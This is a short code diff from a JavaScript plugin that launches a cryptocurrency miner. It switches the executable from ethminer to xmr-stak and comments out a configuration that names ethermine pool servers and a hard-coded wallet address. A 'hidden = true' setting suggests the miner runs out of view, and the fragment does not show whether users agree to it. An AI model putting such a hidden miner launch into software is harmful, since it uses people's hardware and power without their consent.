@@ -14,9 +14,14 @@ plugin.initialize(status => {
     }
   });*/
  
-  const path = "helpers\\ethminer.exe";
-  const args = "--farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O 0x799db2f010a5a9934eca801c5d702a7d96373b9d.XIGMA";
-  const environmentVariables = { GPU_FORCE_64BIT_PTR: "0", GPU_MAX_HEAP_SIZE: "100", GPU_USE_SYNC_OBJECTS: "1", GPU_MAX_ALLOC_PERCENT: "100", GPU_SINGLE_ALLOC_PERCENT: "100"};
+  const path = "helpers\\xmr-stak.exe";
+  const args = "";
+  const environmentVariables = { };
+
+  //const path = "helpers\\ethminer.exe";
+  //const args = "--farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O 0x799db2f010a5a9934eca801c5d702a7d96373b9d.XIGMA";
+  //const environmentVariables = { GPU_FORCE_64BIT_PTR: "0", GPU_MAX_HEAP_SIZE: "100", GPU_USE_SYNC_OBJECTS: "1", GPU_MAX_ALLOC_PERCENT: "100", GPU_SINGLE_ALLOC_PERCENT: "100"};
+
   const hidden = true;
 
   plugin.get().onDataReceivedEvent.addListener(({ error, data }) => {
